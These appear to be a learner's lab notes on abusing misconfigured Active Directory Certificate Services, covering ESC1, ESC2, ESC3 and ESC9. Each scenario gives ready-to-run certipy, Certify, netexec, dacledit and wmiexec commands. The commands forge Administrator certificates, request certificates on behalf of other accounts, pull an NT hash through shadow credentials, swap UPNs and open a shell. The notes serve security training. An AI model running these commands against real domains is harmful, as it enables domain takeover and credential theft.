```
netexec ldap 10.129.205.199 -u "blwasp" -p "Password123!" -M adcs
```
%% use nxc to identify if there are any ADCS servers in the domain %%

```
certipy find -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -stdout
```
%% use certipy to enumerate ADCS service %%

## ESC1
The primary misconfiguration behind this domain escalation scenario lies in the possibility of specifying an alternate user in the certificate request. This means that if a certificate template allows including a subjectAltName (SAN) different from the user making the certificate request (CSR), it would allow us to request a certificate as any user in the domain. e.g if we compromise a domain account and it allowa inclusion of alternate names then we could request a certificate using desired alternate account.

## ESC1 Abuse Requirements

To abuse ESC1 the following conditions must be met:

1. The Enterprise CA grants enrollment rights to low-privileged users.
2. Manager approval should be turned off (social engineering tactics can bypass these security measures).
3. No authorized signatures are required.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template defines EKUs that enable authentication.
6. The certificate template allows requesters to specify a subjectAltName (SAN) in the CSR.


```
certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout
```
%% find vulnerabilities in ADCS %%

```
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
```
%% certificate request with alternative SAN which creates a cert file name administrator.pfx which we can use later to authenticate as Administrator %%

```
certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199
```
%% authenticate using administrator.pfx %%

```
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
```
%%To use Kerberos and generate a TGT, we need to be able to make a domain name resolution. We can configure our DNS to point to the domain or put the domain name in the /etc/hosts file.%%

```
$  .\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC1 /altname:administrator@lab.local
```
%% certificate request with alternative SAN (windows)%%

## ESC2
When a certificate template specifies the Any Purpose Extended Key Usage (EKU) or does not identify any Extended Key Usage, the certificate can be used for any purpose (client authentication, server authentication, code signing, etc.). If the template allows specifying a SAN in the CSR, a template vulnerable to ESC2 can be exploited similarly to ESC1.

## ESC2 Abuse Requirements

To abuse ESC2, the following conditions must be met:

1. The Enterprise CA must provide enrollment rights to low-privileged users.
2. Manager approval should be turned off.
3. No authorized signatures should be necessary.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template should define Any Purpose Extended Key Usage or have no Extended Key Usage specified.
```
Attack vector same as ESC1
```

## ESC3

The third abuse scenario, ESC3, is to abuse Misconfigured Enrollment Agent Templates, which bears similarities to ESC1 and ESC2. However, it involves exploiting a different Extended Key Usage (EKU) and necessitates an additional step to carry out the abuse.

To abuse this for privilege escalation, a CA requires at least two templates matching the conditions below:

Condition 1 - Involves a template that grants low-privileged users the ability to obtain an enrollment agent certificate. This condition is characterized by several specific details, which are consistent with those outlined in ESC1:

1. The Enterprise CA grants low-privileged users enrollment rights (same as ESC1).
2. Manager approval should be turned off (same as ESC1).
3. No authorized signatures are required (same as ESC1).
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates (same as ESC1).
5. The certificate template includes the Certificate Request Agent EKU, specifically the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1), allowing the requesting of other certificate templates on behalf of other principals.
Condition 2 - Another template that permits low-privileged users to use the enrollment agent certificate to request certificates on behalf of other users. Additionally, this template defines an Extended Key Usage that allows for domain authentication. The conditions are as follows:

6. The Enterprise CA grants low-privileged users enrollment rights (same as ESC1).
7. Manager approval should be turned off (same as ESC1).
8. The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
9. The certificate template defines an EKU that enables domain authentication.
10. No restrictions on enrollment agents are implemented at the CA level.

```
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca 'lab-LAB-DC-CA' -template 'ESC3'
```
%% ESC3 cert request for blwasp or for the user who we intend to use to request a cert %%

```
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template 'User' -on-behalf-of 'lab\administrator' -pfx blwasp.pfx
```
%% request cert on behalf of administrator account%%

## ESC9
A key aspect to grasp is that if the msPKI-Enrollment-Flag attribute of a certificate template contains the CT_FLAG_NO_SECURITY_EXTENSION flag, it effectively negates the embedding of the szOID_NTDS_CA_SECURITY_EXT security extension. This means that irrespective of the configuration of the StrongCertificateBindingEnforcement registry key (even if set to its default value of 1), the mapping process will occur as if the registry key had a value of 0, essentially bypassing strong certificate mapping.

Consequently, this loophole can be exploited if we possess sufficient privileges to access and modify a user account's User Principal Name (UPN), aligning it with the UPN of another account. By leveraging this manipulated configuration, we can request a certificate for the user using their legitimate credentials. Remarkably, the obtained certificate will be seamlessly mapped to the other account, which is the ultimate target.

## ESC9 Abuse Requirements
To successfully abuse this misconfiguration, specific prerequisites must be met:

1. The StrongCertificateBindingEnforcement registry key should not be set to 2 (by default, it is set to 1), or the CertificateMappingMethods should contain the UPN flag (0x4). Regrettably, as a low-privileged user, accessing and reading the values of these registry keys is typically unattainable.

2. The certificate template must incorporate the CT_FLAG_NO_SECURITY_EXTENSION flag within the msPKI-Enrollment-Flag value.

3. The certificate template should explicitly specify client authentication as its purpose.

4. The attacker must possess at least the GenericWrite privilege against any user account (account A) to compromise the security of any other user account (account B).

```
certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout
```
%% identify vulnerable templates %%

```
git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .
```
%% install dacledit which confirms if we have full control rights over the account whose certificate we want to request. This attack is only possible if we have full control rights over the account we are targeting%%

```
dacledit.py -action read -dc-ip 10.129.205.199 lab.local/blwasp:Password123! -principal blwasp -target user2
```
%% Using DACLEDIT to enumerate user rights%%

```
certipy shadow auto -u 'BlWasp@lab.local' -p 'Password123!' -account user2
```
%%Retrieve user2 NT Hash via Shadow Credentials %%

```
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user3@lab.local
```
%%Change user2(user we have full control over) UPN to user3(target user)%%

```
certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template ESC9
```
%%Request vulnerable certipy with user2%%

```
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
```
%%revert changes of user2 by changing user2 back to original UPN%%

```
certipy auth -pfx user3.pfx -domain lab.local
```
%%authenticate as user3 with the previous cert%%